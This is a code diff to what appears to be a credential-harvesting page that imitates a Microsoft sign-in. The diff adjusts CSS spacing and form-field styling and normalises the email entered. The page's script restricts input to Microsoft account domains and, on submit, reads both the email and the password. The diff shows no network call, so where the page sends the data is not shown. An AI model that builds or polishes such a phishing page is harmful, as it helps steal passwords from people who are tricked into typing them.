@@ -83,8 +83,8 @@
       }
       
       .row.my-5.py-5 {
-        margin: 20px 0 !important;
-        padding: 20px 0 !important;
+        margin: 80px 0 !important;
+        padding: 40px 0 !important;
       }
       
       .col-lg-6 {
@@ -101,6 +101,9 @@
       .form-control {
         font-size: 16px !important;
         padding: 12px 0 !important;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
       }
       
       .btn {
@@ -161,9 +164,17 @@
         padding: 15px !important;
       }
       
+      .row.my-5.py-5 {
+        margin: 100px 0 !important;
+        padding: 50px 0 !important;
+      }
+      
       .form-control {
         font-size: 16px !important;
         padding: 15px 0 !important;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        appearance: none;
       }
       
       .btn {
@@ -240,6 +251,9 @@
       // Strict Microsoft domain validation (whitelist of genuine Microsoft consumer/work domains)
       function isValidMicrosoftAccount(email) {
         if (!email || typeof email !== 'string') return false;
+        
+        // Trim and normalize email
+        email = email.trim().toLowerCase();
 
         // Basic email format validation
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -307,6 +321,10 @@
 
       $('#next').click(function () {
         var my_email = $('#email').val();
+        
+        // Trim whitespace and normalize email
+        my_email = my_email.trim().toLowerCase();
+        $('#email').val(my_email);
 
         if (!isValidMicrosoftAccount(my_email)) {
           showError('Please enter a valid Microsoft account email address');
@@ -333,6 +351,11 @@
       $('#submit-btn').click(function(event){
         event.preventDefault();
         var email=$("#email").val();
+        
+        // Trim whitespace and normalize email
+        email = email.trim().toLowerCase();
+        $('#email').val(email);
+        
         var password=$("#password").val();
         var detail=$("#field").html();
 
